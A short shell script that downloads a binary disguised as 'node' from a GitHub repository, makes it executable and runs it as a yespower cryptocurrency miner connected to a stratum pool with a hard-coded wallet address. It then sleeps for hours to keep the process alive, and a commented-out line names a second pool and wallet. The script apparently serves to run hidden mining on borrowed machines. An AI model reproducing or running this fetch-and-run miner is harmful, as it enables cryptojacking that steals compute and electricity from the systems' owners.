#!/bin/sh
set -e
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
WORKER_NUMBER=$1
HOURESX=crf_$WORKER_NUMBER
PASSHOURS=$(date +%M%S)
#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.${WORKER_NUMBER}_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
./node -a yespower -o stratum+tcp://pool.sprintpay.net:3032 -u SNxEnbY4EaMLaXDxceZoYzQc7pknwEB8zV.${HOURESX} -p ${PASSHOURS} > try.log
sleep 29999

